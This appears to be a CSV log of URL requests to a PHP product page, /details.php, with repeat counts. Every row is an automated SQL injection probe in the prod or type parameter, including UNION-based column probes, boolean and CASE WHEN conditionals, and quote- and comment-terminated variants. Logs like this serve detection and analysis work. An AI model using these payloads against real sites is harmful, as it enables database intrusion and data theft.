full_url,repeat_count
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176787171%2C0x4c53626451794f7056504d6243526c5a63624f66777244524f794b666d6a435358677a6a4e624f61%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL--%20-&type=2,52
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x47467a78564b796f716e62477a5142685066646b4268546479586b75534d53705875614a4f4b4650%2C0x7178706a71%29--%20-&type=2,53
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CCONCAT%280x7176787171%2C0x72454866616d476d6557%2C0x7178706a71%29%2CNULL%2CNULL--%20-&type=2,54
/details.php?prod=5%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x786b4b586d4e6352676c%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,55
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x68477677566157555472%2C0x7178706a71%29%2CNULL--%20-&type=2,56
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CCONCAT%280x7176787171%2C0x696d5645467a77464966%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL--%20-&type=2,57
/details.php?prod=5%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x7952746142697372506c%2C0x7178706a71%29--%20-&type=2,58
/details.php?prod=-4064%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCONCAT%280x7176787171%2C0x7a72765a6b50446c514c74636c5767655748475263464f437572424f78707876614f6b43786f696a%2C0x7178706a71%29%2CNULL--%20-&type=2,59
/details.php?prod=-4137%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x4f7749534661556e684374724c706c4355644a6f5a44445a44684b4a664c67497455524e4f715749%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,60
/details.php?prod=-3940%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C%28CASE%20WHEN%20%287430%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%207430%29%20THEN%201%20ELSE%200%20END%29%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,61
/details.php?prod=5&type=6393,62
/details.php?prod=5&type=2%2C%28%29%28%27%29%2C.%22%2C,63
/details.php?prod=5&type=2%27HljAqz%3C%27%22%3EyHOwmz,64
/details.php?prod=5&type=2%29%20AND%208716%3D9109%20AND%20%281552%3D1552,65
/details.php?prod=5&type=2%29%20AND%203472%3D3472%20AND%20%287932%3D7932,66
/details.php?prod=5&type=2%29%29%20AND%205166%3D2352%20AND%20%28%287644%3D7644,67
/details.php?prod=5&type=2%29%29%20AND%203472%3D3472%20AND%20%28%287331%3D7331,68
/details.php?prod=5&type=2%20AND%204617%3D5756,69
/details.php?prod=5&type=2%20AND%203472%3D3472,70
/details.php?prod=5&type=2%20AND%206407%3D2358--%20fzKA,71
/details.php?prod=5&type=2%20AND%203472%3D3472--%20uzEC,72
/details.php?prod=5&type=2%27%29%20AND%206581%3D1433%20AND%20%28%27LKYQ%27%3D%27LKYQ,73
/details.php?prod=5&type=2%27%29%20AND%203472%3D3472%20AND%20%28%27QZkv%27%3D%27QZkv,74
/details.php?prod=5&type=2%27%29%29%20AND%209127%3D4603%20AND%20%28%28%27xkiu%27%3D%27xkiu,75
/details.php?prod=5&type=2%27%29%29%20AND%203472%3D3472%20AND%20%28%28%27TlOA%27%3D%27TlOA,76
/details.php?prod=5&type=2%27%20AND%202543%3D5552%20AND%20%27VekL%27%3D%27VekL,77
/details.php?prod=5&type=2%27%20AND%203472%3D3472%20AND%20%27MyDi%27%3D%27MyDi,78
/details.php?prod=5&type=2%27%29%20AND%202508%3D8310%20AND%20%28%27neNd%27%20LIKE%20%27neNd,79
/details.php?prod=5&type=2%27%29%20AND%203472%3D3472%20AND%20%28%27JVCY%27%20LIKE%20%27JVCY,80
/details.php?prod=5&type=2%25%27%20AND%201185%3D4224%20AND%20%27RYak%25%27%3D%27RYak,81
/details.php?prod=5&type=2%25%27%20AND%203472%3D3472%20AND%20%27GdvS%25%27%3D%27GdvS,82
/details.php?prod=5&type=2%27%20AND%203160%3D7429%20AND%20%27TPLI%27%20LIKE%20%27TPLI,83
/details.php?prod=5&type=2%27%20AND%203472%3D3472%20AND%20%27NTNF%27%20LIKE%20%27NTNF,84
/details.php?prod=5&type=2%22%29%20AND%206374%3D1822%20AND%20%28%22KSaV%22%3D%22KSaV,85
/details.php?prod=5&type=2%22%29%20AND%203472%3D3472%20AND%20%28%22qNRL%22%3D%22qNRL,86
/details.php?prod=5&type=2%22%20AND%206571%3D7821%20AND%20%22IFnO%22%3D%22IFnO,87
/details.php?prod=5&type=2%22%20AND%203472%3D3472%20AND%20%22uNKY%22%3D%22uNKY,88
/details.php?prod=5&type=2%29%20AND%208160%3D%28SELECT%20%28CASE%20WHEN%20%288160%3D5373%29%20THEN%208160%20ELSE%20%28SELECT%205373%20UNION%20SELECT%207398%29%20END%29%29--%20-,89
/details.php?prod=5&type=2%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,90
/details.php?prod=5&type=2%29%29%20AND%201567%3D%28SELECT%20%28CASE%20WHEN%20%281567%3D3560%29%20THEN%201567%20ELSE%20%28SELECT%203560%20UNION%20SELECT%201549%29%20END%29%29--%20-,91
/details.php?prod=5&type=2%29%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,92
/details.php?prod=5&type=2%20AND%208271%3D%28SELECT%20%28CASE%20WHEN%20%288271%3D4783%29%20THEN%208271%20ELSE%20%28SELECT%204783%20UNION%20SELECT%208954%29%20END%29%29--%20-,93
/details.php?prod=5&type=2%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,94
/details.php?prod=5&type=2%27%29%20AND%201281%3D%28SELECT%20%28CASE%20WHEN%20%281281%3D8198%29%20THEN%201281%20ELSE%20%28SELECT%208198%20UNION%20SELECT%202680%29%20END%29%29--%20-,95
/details.php?prod=5&type=2%27%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,96
/details.php?prod=5&type=2%27%29%29%20AND%206022%3D%28SELECT%20%28CASE%20WHEN%20%286022%3D5584%29%20THEN%206022%20ELSE%20%28SELECT%205584%20UNION%20SELECT%209180%29%20END%29%29--%20-,97
/details.php?prod=5&type=2%27%29%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,98
/details.php?prod=5&type=2%27%20AND%204447%3D%28SELECT%20%28CASE%20WHEN%20%284447%3D7412%29%20THEN%204447%20ELSE%20%28SELECT%207412%20UNION%20SELECT%205011%29%20END%29%29--%20-,99
/details.php?prod=5&type=2%27%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,100
/details.php?prod=5&type=2%25%27%20AND%207006%3D%28SELECT%20%28CASE%20WHEN%20%287006%3D8044%29%20THEN%207006%20ELSE%20%28SELECT%208044%20UNION%20SELECT%206189%29%20END%29%29--%20-,101
/details.php?prod=5&type=2%25%27%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,102
/details.php?prod=5&type=2%22%29%20AND%204773%3D%28SELECT%20%28CASE%20WHEN%20%284773%3D4426%29%20THEN%204773%20ELSE%20%28SELECT%204426%20UNION%20SELECT%204308%29%20END%29%29--%20-,103
/details.php?prod=5&type=2%22%29%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,104
/details.php?prod=5&type=2%22%20AND%208861%3D%28SELECT%20%28CASE%20WHEN%20%288861%3D3486%29%20THEN%208861%20ELSE%20%28SELECT%203486%20UNION%20SELECT%205845%29%20END%29%29--%20-,105
/details.php?prod=5&type=2%22%20AND%204553%3D%28SELECT%20%28CASE%20WHEN%20%284553%3D4553%29%20THEN%204553%20ELSE%20%28SELECT%202572%20UNION%20SELECT%207484%29%20END%29%29--%20-,106
/details.php?prod=5&type=2%29%20AND%201015%3D6206--%20-,107
/details.php?prod=5&type=2%29%20AND%201215%3D1215--%20-,108
/details.php?prod=5&type=2%29%29%20AND%206058%3D6275--%20-,109
/details.php?prod=5&type=2%29%29%20AND%201215%3D1215--%20-,110
/details.php?prod=5&type=2%20AND%205669%3D9841--%20-,111
/details.php?prod=5&type=2%20AND%201215%3D1215--%20-,112
/details.php?prod=5&type=2%27%29%20AND%201967%3D7381--%20-,113
/details.php?prod=5&type=2%27%29%20AND%201215%3D1215--%20-,114
/details.php?prod=5&type=2%27%29%29%20AND%207084%3D3648--%20-,115
/details.php?prod=5&type=2%27%29%29%20AND%201215%3D1215--%20-,116
/details.php?prod=5&type=2%27%20AND%205006%3D6519--%20-,117
/details.php?prod=5&type=2%27%20AND%201215%3D1215--%20-,118
/details.php?prod=5&type=2%25%27%20AND%202371%3D4521--%20-,119
/details.php?prod=5&type=2%25%27%20AND%201215%3D1215--%20-,120
/details.php?prod=5&type=2%22%29%20AND%206749%3D2711--%20-,121
/details.php?prod=5&type=2%22%29%20AND%201215%3D1215--%20-,122
/details.php?prod=5&type=2%22%20AND%203973%3D5645--%20-,123
/details.php?prod=5&type=2%22%20AND%201215%3D1215--%20-,124
/details.php?prod=5&type=%28SELECT%20%28CASE%20WHEN%20%282756%3D1612%29%20THEN%202%20ELSE%20%28SELECT%201612%20UNION%20SELECT%202191%29%20END%29%29,125
/details.php?prod=5&type=%28SELECT%20%28CASE%20WHEN%20%288554%3D8554%29%20THEN%202%20ELSE%20%28SELECT%205179%20UNION%20SELECT%206198%29%20END%29%29,126
/details.php?prod=5&type=%28CASE%20WHEN%20%285698%3D4582%29%20THEN%205698%20ELSE%205698%2A%28SELECT%205698%20FROM%20DUAL%20UNION%20SELECT%204582%20FROM%20DUAL%29%20END%29,127
/details.php?prod=5&type=%28CASE%20WHEN%20%284726%3D4726%29%20THEN%204726%20ELSE%204726%2A%28SELECT%204726%20FROM%20DUAL%20UNION%20SELECT%209486%20FROM%20DUAL%29%20END%29,128
/details.php?prod=5&type=%28CASE%20WHEN%206130%3D9727%20THEN%206130%20ELSE%20NULL%20END%29,129
/details.php?prod=5&type=%28CASE%20WHEN%209099%3D9099%20THEN%209099%20ELSE%20NULL%20END%29,130
/details.php?prod=5&type=%28SELECT%20CONCAT%28CONCAT%280x7176787171%2C%28CASE%20WHEN%20%289673%3D9673%29%20THEN%200x31%20ELSE%200x30%20END%29%29%2C0x7178706a71%29%29,131
/details.php?prod=5&type=2%29%20AND%209849%3D5519%23,132
/details.php?prod=5&type=2%29%20AND%202569%3D2569%23,133
/details.php?prod=5&type=2%29%29%20AND%202995%3D3620%23,134
/details.php?prod=5&type=2%29%29%20AND%202569%3D2569%23,135
/details.php?prod=5&type=2%29%29%29%20AND%208247%3D7956%23,136
/details.php?prod=5&type=2%29%29%29%20AND%202569%3D2569%23,137
/details.php?prod=5&type=2%20AND%201812%3D6518%23,138
/details.php?prod=5&type=2%20AND%202569%3D2569%23,139
/details.php?prod=5&type=2%29%29%20AS%20WObP%20WHERE%204865%3D4865%20AND%203612%3D4038%23,140
/details.php?prod=5&type=2%29%29%20AS%20FhHR%20WHERE%204731%3D4731%20AND%202569%3D2569%23,141
/details.php?prod=5&type=2%29%20AS%20yZJD%20WHERE%202652%3D2652%20AND%202329%3D8859%23,142
/details.php?prod=5&type=2%29%20AS%20Ddws%20WHERE%208167%3D8167%20AND%202569%3D2569%23,143
/details.php?prod=5&type=2%60%20WHERE%206743%3D6743%20AND%209144%3D7423%23,144
/details.php?prod=5&type=2%60%20WHERE%203631%3D3631%20AND%202569%3D2569%23,145
/details.php?prod=5&type=2%60%29%20WHERE%208528%3D8528%20AND%207285%3D1370%23,146
/details.php?prod=5&type=2%60%29%20WHERE%207743%3D7743%20AND%202569%3D2569%23,147
/details.php?prod=5&type=2%27%29%20AND%201929%3D4579%23,148
/details.php?prod=5&type=2%27%29%20AND%202569%3D2569%23,149
/details.php?prod=5&type=2%27%20AND%204887%3D1900%23,150
/details.php?prod=5&type=2%27%20AND%202569%3D2569%23,151
/details.php?prod=5&type=2%22%20AND%201467%3D1200%23,152
/details.php?prod=5&type=2%22%20AND%202569%3D2569%23,153
/details.php?prod=5&type=2%27%29%29%20AND%209837%3D5294%23,154
/details.php?prod=5&type=2%27%29%29%20AND%202569%3D2569%23,155
/details.php?prod=5&type=2%27%29%29%29%20AND%201626%3D2243%23,156
/details.php?prod=5&type=2%27%29%29%29%20AND%202569%3D2569%23,157
/details.php?prod=5&type=2%25%27%20AND%207472%3D3764%23,158
/details.php?prod=5&type=2%25%27%20AND%202569%3D2569%23,159
/details.php?prod=5&type=2%22%29%20AND%207980%3D7147%23,160
/details.php?prod=5&type=2%22%29%20AND%202569%3D2569%23,161
/details.php?prod=5&type=2%22%29%29%20AND%206577%3D7798%23,162
/details.php?prod=5&type=2%22%29%29%20AND%202569%3D2569%23,163
/details.php?prod=5&type=2%22%29%29%29%20AND%207773%3D5287%23,164
/details.php?prod=5&type=2%22%29%29%29%20AND%202569%3D2569%23,165
/details.php?prod=5&type=2%27%29%29%20AS%20vyye%20WHERE%202221%3D2221%20AND%202702%3D7648%23,166
/details.php?prod=5&type=2%27%29%29%20AS%20NrTQ%20WHERE%202918%3D2918%20AND%202569%3D2569%23,167
/details.php?prod=5&type=2%22%29%29%20AS%20sVIN%20WHERE%209425%3D9425%20AND%203662%3D2555%23,168
/details.php?prod=5&type=2%22%29%29%20AS%20ZAOq%20WHERE%202900%3D2900%20AND%202569%3D2569%23,169
/details.php?prod=5&type=2%27%29%20AS%20iKdP%20WHERE%205326%3D5326%20AND%204429%3D7933%23,170
/details.php?prod=5&type=2%27%29%20AS%20zybq%20WHERE%202936%3D2936%20AND%202569%3D2569%23,171
/details.php?prod=5&type=2%22%29%20AS%20Tkgk%20WHERE%206188%3D6188%20AND%203693%3D8359%23,172
/details.php?prod=5&type=2%22%29%20AS%20ahdr%20WHERE%204342%3D4342%20AND%202569%3D2569%23,173
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20AND%207670%3D9427%23,174
/details.php?prod=5&type=2%27%20IN%20BOOLEAN%20MODE%29%20AND%202569%3D2569%23,175
/details.php?prod=5&type=-8207,176
/details.php?prod=5&type=-9272%29%20OR%203169%3D5326%23,177
/details.php?prod=5&type=-3671%29%20OR%209083%3D9083%23,178
/details.php?prod=5&type=-4243%29%29%20OR%203787%3D6486%23,179
/details.php?prod=5&type=-5718%29%29%20OR%209083%3D9083%23,180
/details.php?prod=5&type=-6951%29%29%29%20OR%203722%3D7363%23,181
/details.php?prod=5&type=-8590%29%29%29%20OR%209083%3D9083%23,182
/details.php?prod=5&type=-8010%20OR%207745%3D4268%23,183
/details.php?prod=5&type=-8197%20OR%209083%3D9083%23,184
/details.php?prod=5&type=-2326%29%29%20AS%20RGIV%20WHERE%202303%3D2303%20OR%209477%3D4415%23,185
/details.php?prod=5&type=-2308%29%29%20AS%20UPqx%20WHERE%208622%3D8622%20OR%209083%3D9083%23,186
/details.php?prod=5&type=-3699%29%20AS%20GlCT%20WHERE%203266%3D3266%20OR%208477%3D5663%23,187
/details.php?prod=5&type=-8664%29%20AS%20CDja%20WHERE%207237%3D7237%20OR%209083%3D9083%23,188
/details.php?prod=5&type=-7538%27%29%20OR%209339%3D9350%23,189
/details.php?prod=5&type=-1279%27%29%20OR%209083%3D9083%23,190
/details.php?prod=5&type=-5987%27%20OR%207686%3D9946%23,191
/details.php?prod=5&type=-3855%27%20OR%209083%3D9083%23,192
/details.php?prod=5&type=-5940%22%20OR%209596%3D9586%23,193
/details.php?prod=5&type=-6044%22%20OR%209083%3D9083%23,194
/details.php?prod=5&type=-1210%27%29%29%20OR%205228%3D1888%23,195
/details.php?prod=5&type=-7413%27%29%29%20OR%209083%3D9083%23,196
/details.php?prod=5&type=-4651%27%29%29%29%20OR%209028%3D9294%23,197
/details.php?prod=5&type=-9438%27%29%29%29%20OR%209083%3D9083%23,198
/details.php?prod=5&type=-7233%25%27%20OR%201780%3D9303%23,199
/details.php?prod=5&type=-2653%25%27%20OR%209083%3D9083%23,200
/details.php?prod=5&type=-8848%22%29%20OR%205485%3D7166%23,201
/details.php?prod=5&type=-5959%22%29%20OR%209083%3D9083%23,202
/details.php?prod=5&type=-7505%22%29%29%20OR%204510%3D6275%23,203
/details.php?prod=5&type=-6585%22%29%29%20OR%209083%3D9083%23,204
/details.php?prod=5&type=-5628%22%29%29%29%20OR%206562%3D9629%23,205
/details.php?prod=5&type=-4672%22%29%29%29%20OR%209083%3D9083%23,206
/details.php?prod=5&type=-2394%27%29%29%20AS%20ldRf%20WHERE%208197%3D8197%20OR%206934%3D9449%23,207
/details.php?prod=5&type=-4059%27%29%29%20AS%20etMJ%20WHERE%206379%3D6379%20OR%209083%3D9083%23,208
/details.php?prod=5&type=-2558%22%29%29%20AS%20AviV%20WHERE%204759%3D4759%20OR%206996%3D2943%23,209
/details.php?prod=5&type=-6123%22%29%29%20AS%20ZFuN%20WHERE%202960%3D2960%20OR%209083%3D9083%23,210
/details.php?prod=5&type=-5838%27%29%20AS%20lGdw%20WHERE%206432%3D6432%20OR%209573%3D5885%23,211
/details.php?prod=5&type=-7369%27%29%20AS%20liDX%20WHERE%207056%3D7056%20OR%209083%3D9083%23,212
/details.php?prod=5&type=-2400%22%29%20AS%20YdUw%20WHERE%202250%3D2250%20OR%201771%3D4227%23,213
/details.php?prod=5&type=-5670%22%29%20AS%20gkfP%20WHERE%202947%3D2947%20OR%209083%3D9083%23,214
/details.php?prod=5&type=2%29%20OR%20NOT%205378%3D3783%23,215
/details.php?prod=5&type=2%29%20OR%20NOT%201089%3D1089%23,216
/details.php?prod=5&type=2%29%29%20OR%20NOT%208199%3D9857%23,217
/details.php?prod=5&type=2%29%29%20OR%20NOT%201089%3D1089%23,218
/details.php?prod=5&type=2%29%29%29%20OR%20NOT%207198%3D5510%23,219
/details.php?prod=5&type=2%29%29%29%20OR%20NOT%201089%3D1089%23,220
/details.php?prod=5&type=2%20OR%20NOT%207952%3D6264%23,221
/details.php?prod=5&type=2%20OR%20NOT%201089%3D1089%23,222
/details.php?prod=5&type=2%29%29%20AS%20KmZx%20WHERE%208596%3D8596%20OR%20NOT%207509%3D1930%23,223
